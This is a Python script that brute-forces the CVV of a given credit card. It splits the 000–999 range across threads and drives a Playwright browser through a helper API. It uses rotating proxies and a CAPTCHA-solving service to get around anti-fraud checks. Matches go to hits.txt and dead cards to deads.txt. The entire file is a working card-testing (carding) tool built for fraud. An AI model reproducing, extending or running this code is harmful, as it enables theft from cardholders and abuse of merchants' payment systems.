from cloudscraper import create_scraper
from playwright.sync_api import sync_playwright
from random import choice
import colorama
import os
from Libs.api import Api
import sys
from dotenv import load_dotenv

load_dotenv()

TOKEN_CAPTCHA = os.getenv('TOKEN_CAPTCHA')

with open('proxy.txt', 'r', encoding="utf8") as f:
    proxy_list = f.read().split("\n")

def print_color(text, color):

    if 'yellow' in color:
        return

    BOLD_COLORS = {
        'red': colorama.Fore.RED,
        'green': colorama.Fore.GREEN,
        'yellow': colorama.Fore.YELLOW,
        'blue': colorama.Fore.BLUE,
        'magenta': colorama.Fore.MAGENTA,
        'cyan': colorama.Fore.CYAN,
        'white': colorama.Fore.WHITE,
    }
    print(BOLD_COLORS[color] + text + colorama.Style.RESET_ALL)

tries = {}

def process(id_bot, bot, cc, month, year, cvv):
    
    global tries

    try:

        if os.path.exists(f'hits.txt'):
            with open(f'hits.txt', 'r', encoding='utf8') as f:
                if cc in f.read():
                    bot.end(retry=False)
                    os._exit(0)
                    sys.exit(0)
                    raise SystemExit()
                    exit()
                    return

        if os.path.exists(f'deads.txt'):
            with open(f'deads.txt', 'r') as f:
                if cc in f.read():
                    bot.end(retry=False)
                    os._exit(0)
                    sys.exit(0)
                    raise SystemExit()
                    exit()
                    return

        if os.path.exists(f'db/{cc}.txt'):
            with open(f'db/{cc}.txt', 'r', encoding='utf8') as file:
                if cvv in file.read():
                    return

        proxy = choice(proxy_list)

        result = bot.test_cc(cc, month, year, cvv, proxy)

        if result['error'] == True:
                print_color(f'[❗] {cc}|{month}|{year}|{cvv} - {result["response"]}', 'yellow')
                if 'HTTPSConnectionPool' in result['response']:pass
                else:bot.end()
                return process(id_bot, bot, cc, month, year, cvv)
 
        if 'reCAPTCHA not solved' in result['response']:
            print_color(f'[❗] {cc}|{month}|{year}|{cvv} - {result["response"]}', 'yellow')        
            return process(id_bot, bot, cc, month, year, cvv)

        elif 'response not found' in result['response']:
            print_color(f'[❗] {cc}|{month}|{year}|{cvv} - {result["response"]}', 'yellow')
            if tries[id_bot] == 5:
                tries[id_bot] = 0
                bot.end()
            else:
                tries[id_bot] += 1
            return process(id_bot, bot, cc, month, year, cvv)

        else:

            if 'Decline' == result['response']:
                print_color(f'[✔] {cc}|{month}|{year}|{cvv} - {result["response"]}', 'green')
                with open('hits.txt','a', encoding="utf8") as file:
                    file.write(f'[👻] {cc}|{month}|{year}|{cvv}' + '\n')
                bot.end(retry=False)
                os._exit(0)
                sys.exit(0)
                raise SystemExit()
                exit()
                return

            elif 'CVV2' in result['response']:
                print_color(f'[❌] {cc}|{month}|{year}|{cvv} - {result["response"]}', 'red')
                with open(f'db/{cc}.txt', 'a', encoding="utf8") as f:
                    f.write( f'{cvv} | {result["response"]}' + '\n')
                return

            elif 'invalid account number' in result['response'].lower():
                print_color(f'[❌] {cc}|{month}|{year}|{cvv} - {result["response"]}', 'red')
                with open('deads.txt','a', encoding="utf8") as file:
                    file.write(f'[👹] {cc}|{month}|{year}|{cvv}' + '\n')
                bot.end(retry=False)
                os._exit(0)
                sys.exit(0)
                raise SystemExit()
                exit()
                return

            else:
                print_color(f'[❗] {cc}|{month}|{year}|{cvv} - {result["response"]}', 'yellow') 
                if 'HTTPSConnectionPool' in result['response']:pass
                else:bot.end()
                return process(id_bot, bot, cc, month, year, cvv)

    except Exception as e:
        bot.end()
        return process(id_bot, bot, cc, month, year, cvv)

def verify_cc(id_bot, cc, month, year, range_start, range_end):
    try:

        with open('hits.txt', 'r', encoding="utf8") as f:
            if cc in f.read():
                sys.exit(0)
                os._exit(0)
                exit()
                return

        with open(f'deads.txt', 'r', encoding="utf8") as f:
            if cc in f.read():
                sys.exit(0)
                os._exit(0)
                exit()
                return

        tries[id_bot] = 0
        bot = Api(captcha_key=TOKEN_CAPTCHA, proxy_list=proxy_list)
        bot.start_browser()

        for cvv in range(range_start, range_end):

            cvv = str(cvv).zfill(3)

            if os.path.exists(f'db/{cc}.txt'):
                with open(f'db/{cc}.txt', 'r', encoding='utf8') as file:
                    if cvv in file.read():
                        continue

            with open('hits.txt', 'r', encoding="utf8") as f:
                if cc in f.read():
                    bot.end(retry=False)
                    os._exit(0)
                    sys.exit(0)
                    exit()
                    break

            with open(f'deads.txt', 'r') as f:
                if cc in f.read():
                    bot.end(retry=False)
                    os._exit(0)
                    sys.exit(0)
                    exit()
                    return

            process(id_bot, bot, cc, month, year, cvv)

    except Exception as e:
        print(e)
        return verify_cc(id_bot, cc, month, year, range_start, range_end)

def divide_ranges(start, end, sequence):
    ranges = []
    step = (end - start) // sequence
    for i in range(sequence):
        if i == sequence - 1:
            ranges.append([start + i * step, end])
        else:
            ranges.append([start + i * step, start + (i + 1) * step])
    return ranges

sequence = 8
start_range = 0
end_range = 1000

import argparse
import concurrent.futures


def main():

    parser = argparse.ArgumentParser(description="Process credit card ranges.")

    parser.add_argument("--cc", type=str, required=True, help="Credit card (CC) to verify.")
    parser.add_argument("--month", type=str, required=True, help="Month in MM format.")
    parser.add_argument("--year", type=str, required=True, help="Year in YYYY format.")
    parser.add_argument("--start_range", type=int, required=True, help="Start of the range.")
    parser.add_argument("--end_range", type=int, required=True, help="End of the range.")
    parser.add_argument("--sequence", type=int, required=True, help="Number of sequences to divide the range.")

    args = parser.parse_args()

    ranges = divide_ranges(args.start_range, args.end_range, args.sequence)

    with concurrent.futures.ThreadPoolExecutor(max_workers=len(ranges)) as executor:
        for i, range_ in enumerate(ranges):
            executor.submit(verify_cc, i, args.cc, args.month, args.year, range_[0], range_[1])

if __name__ == "__main__":
    main()